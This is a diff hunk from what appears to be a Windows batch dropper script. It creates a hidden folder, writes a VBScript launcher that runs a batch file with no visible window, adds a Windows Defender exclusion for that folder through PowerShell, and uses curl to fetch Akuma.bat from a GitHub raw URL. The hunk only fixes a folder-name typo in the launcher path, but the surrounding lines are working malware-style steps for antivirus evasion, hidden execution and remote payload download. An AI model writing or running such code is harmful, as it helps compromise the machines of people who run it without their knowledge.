@@ -4,7 +4,7 @@ mkdir %homedrive%\Amuka
 attrib +h %homedrive%\Amuka
 cd %homedrive%\Amuka
 echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Amuka\Akuma.vbs
-echo objShell.Run "%homedrive%\Akuma\Akuma.bat", 0, False >> %homedrive%\Amuka\Akuma.vbs
+echo objShell.Run "%homedrive%\Amuka\Akuma.bat", 0, False >> %homedrive%\Amuka\Akuma.vbs
 echo cd %~dp0 >> %homedrive%\Amuka\Amuka.bat
 echo powershell Add-MpPreference -ExclusionPath "$env:homedrive\Amuka" >> %homedrive%\Amuka\Amuka.bat
 echo curl -O https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat >> %homedrive%\Amuka\Amuka.bat
